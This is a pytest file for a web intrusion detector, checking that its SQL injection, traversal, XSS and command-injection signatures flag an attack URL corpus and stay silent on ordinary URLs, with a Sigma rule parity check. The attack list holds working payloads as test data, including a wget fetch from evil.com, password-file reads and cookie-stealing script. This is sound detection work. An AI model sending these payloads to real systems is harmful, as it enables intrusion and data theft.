"""Precision and recall for the web attack signatures.

The original patterns matched a bare apostrophe, semicolon, pipe and double
dash. Measured against ordinary URLs, 10 of 15 fired an alert. That is not a
detection rule, it is a noise generator, and in production it would be muted
within a day.

These two corpora are the regression guard. BENIGN must produce zero alerts;
ATTACKS must all be caught. Adding a pattern that catches one more attack at
the cost of a benign match is not an improvement, and this file makes that
tradeoff visible instead of silent.
"""

import pytest

from analyzer.rule_engine import (
    _CMDI,
    _SQLI,
    _TRAVERSAL,
    _XSS,
    _decode,
    run_all_rules,
)

# Ordinary URLs from real applications. None of these are attacks.
BENIGN_URLS = [
    # Punctuation that used to trigger the old patterns
    "/search?q=O'Brien",                                # apostrophe in a surname
    "/products?ids=1;2;3",                              # semicolon-delimited list
    "/filter?tags=red|blue|green",                      # pipe-delimited filter
    "/report?range=2024-01-01--2024-12-31",             # double dash in a date range
    "/cart?coupon=SAVE20&note=Don't%20gift%20wrap",
    "/track?utm_source=news&utm_campaign=q1;q2",
    # SQL keywords appearing legitimately in content
    "/docs/how-to-select-a-plan",
    "/blog/dropping-tables-a-sql-primer",
    "/search?q=union%20jack%20flag",
    "/i18n/en-GB/insert-card",
    "/api/v2/users?select=id,name",                     # PostgREST/GraphQL style
    # Shell command names appearing legitimately in content
    "/wiki/Rm_(Unix)",
    "/docs/ls-command-reference",
    # Ordinary application traffic
    "/index.html",
    "/about",
    "/static/app.min.js",
    "/img/logo@2x.png",
    "/api/v1/orders?status=shipped&page=2",
    "/search?q=c%2B%2B%20tutorial",
    "/calc?expr=(a+b)*c",
    "/files/report%20final.pdf",
    "/products?price=10..50",                           # range syntax, not traversal
    "/user?name=Ann-Marie",
    "/q?s=100%25%20cotton",
    "/u/john.doe/settings",
    "/blog/my-cat-post",
    "/feed.xml",
    "/robots.txt",
    "/health",
    "/api/items?sort=name&order=desc",
    # Search terms as browsers send them, with '+' for each space
    "/search?q=rock+and+roll",
    "/search?q=salt+and+pepper+recipes",
    "/search?q=O'Brien+and+Sons",
    "/search?q=don't+drop+the+ball",
    "/search?q=terms+and+conditions",
    "/search?q=c%2B%2B+or+java",
    "/search?q=cats+or+dogs&page=2",
    "/search?q=it's+1+or+2+days",
    "/search?q=update+my+settings",
    "/search?q=what+is+1%2B1",
    "/jobs?q=sales+%26+marketing",
    # An encoded apostrophe is punctuation, not SQL
    "/search?q=O%27Brien",
    "/search?q=don%27t+stop",
    # Keywords inside longer words, and globs that look like comments
    "/blog/family-reunion-select-venue",
    "/search?q=communion+selection",
    "/static/*/assets/*/main.css",
    "/assets/**/icons/arrow.svg",
]

# Real payloads, including percent-encoded evasions.
ATTACK_URLS = [
    "/products?id=1 UNION SELECT username,password FROM users--",
    "/login.php?user=admin'--&pass=x",
    "/search?q=1' OR '1'='1",
    "/api/item?id=1; DROP TABLE users--",
    "/api/data?id=1 AND sleep(5)--",
    "/page?id=' OR 1=1 LIMIT 1--",
    "/x?id=1%27%20UNION%20SELECT%201,2--",              # encoded
    "/download?file=../../etc/passwd",
    "/view?path=../../../etc/shadow",
    "/file?name=%2e%2e%2fetc%2fpasswd",                 # encoded
    "/img?src=....//....//etc/passwd",
    "/search?q=<script>alert(document.cookie)</script>",
    '/name?v="><img src=x onerror=alert(1)>',
    "/page?title=<svg onload=alert(1)>",
    "/c?t=%3Cscript%3Ealert(1)%3C/script%3E",           # encoded
    "/ping?host=8.8.8.8;cat /etc/passwd",
    "/x?c=`whoami`",
    "/y?c=$(id)",
    "/z?cmd=|| wget http://evil.com/s.sh",
    "/a?f=;/bin/sh",
    # Form-encoded: '+' is a space in a query string
    "/login?u=admin'+OR+'1'='1",
    "/login?u=admin'+--+",
    "/p?id=1+UNION+SELECT+1,2",
    "/p?id=1'+AND+1=1--+",
    "/s?q=<img+src=x+onerror=alert(1)>",
    # Inline comments standing in for spaces, and MySQL versioned comments
    "/p?id=1/**/UNION/**/SELECT/**/1",
    "/p?id=1/*!50000UNION*//*!50000SELECT*/1",
    "/p?id=1UNION SELECT 1",
    "/p?id=1'/**/OR/**/1=1--",
    "/p?id=1;DROP/**/TABLE/**/users",
    "/p?id=1+UNION+ALL+SELECT+1",
]

_SIGNATURES = [('SQLi', _SQLI), ('CmdI', _CMDI), ('XSS', _XSS), ('Traversal', _TRAVERSAL)]


def _matches(path):
    decoded = _decode(path)
    return [name for name, pattern in _SIGNATURES if pattern.search(decoded)]


class TestNoFalsePositives:
    @pytest.mark.parametrize('url', BENIGN_URLS)
    def test_benign_url_triggers_nothing(self, url):
        assert _matches(url) == [], f'{url} matched {_matches(url)}'

    def test_whole_benign_corpus_is_silent(self, web_events):
        """Belt and braces: the corpus through the full rule pipeline."""
        events = web_events(ip='10.0.0.50', paths=BENIGN_URLS, status=200)
        assert run_all_rules(events, 'web') == []


class TestNoFalseNegatives:
    @pytest.mark.parametrize('url', ATTACK_URLS)
    def test_attack_url_is_caught(self, url):
        assert _matches(url), f'{url} matched nothing'

    def test_whole_attack_corpus_alerts(self, web_events):
        events = web_events(ip='172.16.0.99', paths=ATTACK_URLS, status=200)
        threats = run_all_rules(events, 'web')
        types = {t['threat_type'] for t in threats}
        assert 'SQL Injection Attempt' in types
        assert 'Directory Traversal' in types
        assert 'XSS Attempt' in types
        assert 'Command Injection Attempt' in types


class TestUrlDecoding:
    def test_decodes_single_encoding(self):
        assert _decode('%2e%2e%2fetc%2fpasswd') == '../etc/passwd'

    def test_decodes_double_encoding(self):
        """%2527 -> %27 -> ' is a standard evasion."""
        assert _decode('%2527') == "'"

    def test_is_bounded(self):
        """Decoding stops after two passes rather than looping on input."""
        assert _decode('%25252527') == '%2527'

    def test_reads_plus_as_a_space(self):
        assert _decode("admin'+OR+'1'='1") == "admin' OR '1'='1"

    def test_encoded_plus_stays_a_plus(self):
        """%2B is a literal plus; the second pass must not turn it into a space."""
        assert _decode('c%2B%2B') == 'c++'
        assert _decode('1%252B1') == '1+1'

    def test_leaves_plain_paths_alone(self):
        assert _decode('/index.html') == '/index.html'

    def test_encoded_attacks_are_caught(self):
        assert _matches('/x?id=1%27%20UNION%20SELECT%201,2--')
        assert _matches('/c?t=%3Cscript%3Ealert(1)%3C/script%3E')


class TestPrecisionRecallSummary:
    def test_precision_and_recall_are_perfect_on_both_corpora(self):
        """
        A single assertion that states the measured numbers, so a regression
        shows up as a changed metric rather than one confusing test failure.
        """
        false_positives = [u for u in BENIGN_URLS if _matches(u)]
        missed = [u for u in ATTACK_URLS if not _matches(u)]

        assert not false_positives, f'false positives: {false_positives}'
        assert not missed, f'missed attacks: {missed}'


class TestSigmaParity:
    """
    rules/sigma/web_sql_injection.yml says it mirrors the Python rule. It had
    drifted: it missed every '+'-encoded attack (#19) and counted a bare %27,
    an encoded apostrophe, as SQL. Sigma matches the raw, undecoded URI with
    case-insensitive substrings, so that is how it is evaluated here.
    """

    @staticmethod
    def _sigma_selections():
        import os
        import yaml
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            'rules', 'sigma', 'web_sql_injection.yml')
        with open(path, encoding='utf-8') as f:
            detection = yaml.safe_load(f)['detection']
        assert detection['condition'] == ' or '.join(k for k in detection if k != 'condition')
        return [sel for key, sel in detection.items() if key != 'condition']

    def _sigma(self, url):
        """Every selection is OR-ed; evaluate each the way a Sigma backend would."""
        import re
        for sel in self._sigma_selections():
            ((field, value),) = sel.items()
            if field == 'c-uri|contains' and any(n.lower() in url.lower() for n in value):
                return True
            if field == 'c-uri|re|i' and re.search(value, url, re.IGNORECASE):
                return True
            assert field in ('c-uri|contains', 'c-uri|re|i'), f'unhandled modifier {field}'
        return False

    @pytest.mark.parametrize('url', BENIGN_URLS)
    def test_sigma_stays_silent_on_benign_urls(self, url):
        assert not self._sigma(url)

    @pytest.mark.parametrize('url', [u for u in ATTACK_URLS if _SQLI.search(_decode(u))])
    def test_sigma_catches_every_sqli_the_python_rule_catches(self, url):
        assert self._sigma(url)
